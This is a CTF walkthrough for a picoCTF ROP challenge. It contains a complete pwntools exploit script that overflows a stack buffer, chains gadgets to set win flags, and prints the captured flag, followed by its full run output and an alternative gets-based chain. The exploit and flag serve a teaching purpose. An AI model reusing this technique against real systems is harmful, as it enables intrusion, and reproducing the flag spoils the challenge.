How do we set `eax` to `0x804a002`? Couldn't find anything easy like `pop`-ing a value from the stack (which we control) into `eax`. There was a gadget that allowed `pop`-ing into `ebx`, but no easy way to transfer from `ebx` to `eax`. The best thing I could find was a gadget which adds a value to `al`:
```assembly
0x08048ac0 : add al, byte ptr [ebp - 0x3b] ; ret
``` 
Therefore, my strategy was as follows:
1. Set `eax` to a value very close to the address of `win3`. This can be accomplished by simply calling `leapA`, which leaves `eax`'s value as the address of `win1` when exiting the function.
2. Add the missing delta (`&win3 - &win1 = 0x0804a03f - 0x0804a03d = 2`) to `eax` by using the gadget at `0x08048ac0`. Since we control `ebp`, we can point it to an address which satisfies the condition `ebp - 0x3b == 2`:
```
[0x080484d0]> /x 02000000
Searching 4 bytes in [0x804a03c-0x804a040]
hits: 0
Searching 4 bytes in [0x8049f08-0x804a03c]
hits: 1
Searching 4 bytes in [0x8048000-0x8048bbc]
hits: 6
0x08049f80 hit1_0 02000000
0x080480b4 hit1_1 02000000
0x08048180 hit1_2 02000000
0x080481ac hit1_3 02000000
0x08048344 hit1_4 02000000
0x08048a20 hit1_5 02000000
0x08048bb0 hit1_6 02000000
```
3. Call the gadget at `0x080485f3` to set `win3` to `1`.
4. Proceed with calling the other functions...
Here's our final ROP chain:
```
    0x0000:        0x80485e6 leapA()
    0x0004:        0x8048ac0 add al, byte ptr [ebp - 0x3b] ; ret
    0x0008:        0x80485f3 mov byte ptr [eax + 0x3d], 1 ; nop ; pop ebp ; ret
    0x000c:       0xbabababa popped into ebp
    0x0010:        0x80485fd leap2(0xdeadbeef)
    0x0014:        0x8048409  pop ebx; ret
    0x0018:       0xdeadbeef arg0
    0x001c:        0x80485e6 leapA()
    0x0020:        0x80486b3 display_flag()
```
The following script will print the flag:
```python
# First, generate a pwntools template using:
# pwn template --host 2019shell1.picoctf.com --user dvdalt --path /problems/leap-frog_3_5d6cea2f1cec97458549353ec1e7e158/rop
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled
import os
import numpy as np
if shell is not None:
    shell.set_working_directory(os.path.dirname(remote_path))
def send_payload(proc, payload):
    proc.sendlineafter("Enter your input> ", payload)
def get_overflow_offset():
    # It's problematic to create a core dump on an NTFS file system,
    # so reconfigure core dumps to be created elsewhere
    os.system("echo ~/core/core_dump > /proc/sys/kernel/core_pattern")
    os.system("rm core.* > /dev/null")
    proc = process(exe.path)
    payload = cyclic(50, n = exe.bytes)
    send_payload(proc, payload)
    proc.wait()
    offset = cyclic_find(proc.corefile.fault_addr, n = exe.bytes )
    log.info("Overflow offset: {} ({}-byte architecture)".format(offset, exe.bytes))
    return offset
overflow_offset = get_overflow_offset()
log.info("leapA() address: {}".format(hex(exe.symbols["leapA"])))
log.info("leap2() address: {}".format(hex(exe.symbols["leap2"])))
log.info("leap3() address: {}".format(hex(exe.symbols["leap3"])))
log.info("display_flag() address: {}".format(hex(exe.symbols["display_flag"])))
log.info("win1 address: {}".format(hex(exe.symbols["win1"])))
log.info("win2 address: {}".format(hex(exe.symbols["win2"])))
log.info("win3 address: {}".format(hex(exe.symbols["win3"])))
location_of_2 = next(exe.search(p32(2)))
log.info("location_of_2 address: {}".format(hex(location_of_2)))
rop = ROP(context.binary)
rop.leapA()
rop.raw(0x08048ac0) # add al, byte ptr [ebp - 0x3b] ; ret
rop.raw(0x080485f3) # mov byte ptr [eax + 0x3d], 1 ; nop ; pop ebp ; ret
rop.raw(0xBABABABA) # popped into ebp
rop.leap2(0xDEADBEEF)
rop.leapA()
rop.display_flag()
log.info("ROP: \n{}".format(rop.dump()))
ebp = p32(location_of_2 + 0x3b)
log.info("EBP: {}".format(hex(u32(ebp))))
payload = fit({overflow_offset - len(ebp): ebp + str(rop)}, filler = 'A')
log.info("Payload: \n{}".format(hexdump(payload)))
io = start()
send_payload(io, payload)
print io.recvall()
```
Output:
```console
root@kali:/media/sf_CTFs/pico/leap-frog# python exploit.py
[*] '/media/sf_CTFs/pico/leap-frog/rop'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Connecting to 2019shell1.picoctf.com on port 22: Done
[*] PI:EMAIL:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
[+] Opening new channel: 'pwd': Done
[+] Receiving all data: Done (13B)
[*] Closed SSH channel with 2019shell1.picoctf.com
[*] Working directory: '/tmp/tmp.zh7aJOoGFI'
[+] Opening new channel: 'ln -s /home/dvdalt/* .': Done
[+] Receiving all data: Done (0B)
[*] Closed SSH channel with 2019shell1.picoctf.com
[*] Working directory: '/problems/leap-frog_3_5d6cea2f1cec97458549353ec1e7e158'
[+] Starting local process '/media/sf_CTFs/pico/leap-frog/rop': pid 3054
[*] Process '/media/sf_CTFs/pico/leap-frog/rop' stopped with exit code -11 (SIGSEGV) (pid 3054)
[+] Parsing corefile...: Done
[*] '/media/sf_CTFs/pico/leap-frog/core.3054'
    Arch:      i386-32-little
    EIP:       0x61616168
    ESP:       0xffecda80
    Exe:       '/media/sf_CTFs/pico/leap-frog/rop' (0x8048000)
    Fault:     0x61616168
[*] Overflow offset: 28 (4-byte architecture)
[*] leapA() address: 0x80485e6
[*] leap2() address: 0x80485fd
[*] leap3() address: 0x8048666
[*] display_flag() address: 0x80486b3
[*] win1 address: 0x804a03d
[*] win2 address: 0x804a03e
[*] win3 address: 0x804a03f
[*] location_of_2 address: 0x80480b4
[*] Loaded cached gadgets for 'rop'
[*] ROP:
    0x0000:        0x80485e6 leapA()
    0x0004:        0x8048ac0
    0x0008:        0x80485f3
    0x000c:       0xbabababa
    0x0010:        0x80485fd leap2(0xdeadbeef)
    0x0014:        0x8048409  pop ebx; ret
    0x0018:       0xdeadbeef arg0
    0x001c:        0x80485e6 leapA()
    0x0020:        0x80486b3 display_flag()
[*] EBP: 0x80480ef
[*] Payload:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    00000010  41 41 41 41  41 41 41 41  ef 80 04 08  e6 85 04 08  │AAAA│AAAA│····│····│
    00000020  c0 8a 04 08  f3 85 04 08  ba ba ba ba  fd 85 04 08  │····│····│····│····│
    00000030  09 84 04 08  ef be ad de  e6 85 04 08  b3 86 04 08  │····│····│····│····│
    00000040
[+] Starting remote process '/problems/leap-frog_3_5d6cea2f1cec97458549353ec1e7e158/rop' on 2019shell1.picoctf.com: pid 2657143
[+] Receiving all data: Done (50B)
[*] Stopped remote process 'rop' on 2019shell1.picoctf.com (pid 2657143)
picoCTF{h0p_r0p_t0p_y0uR_w4y_t0_v1ct0rY_0db32718}
```
## Alternative Solution:
An alternative solution which is much simpler is to use `gets` to set all three globals to `true` (thanks to [Yaakov](https://twitter.com/YaakovCohen88) for this elegant solution):
```python
overflow_offset = get_overflow_offset()
log.info("win1 address: {}".format(hex(exe.symbols["win1"])))
log.info("display_flag() address: {}".format(hex(exe.symbols["display_flag"])))
rop = ROP(context.binary)
rop.gets(exe.symbols["win1"])
rop.display_flag()
log.info("ROP: \n{}".format(rop.dump()))
payload = fit({overflow_offset: str(rop)})
io = start()
send_payload(io, payload)
io.sendline("\x01\x01\x01")
print io.recvall()
```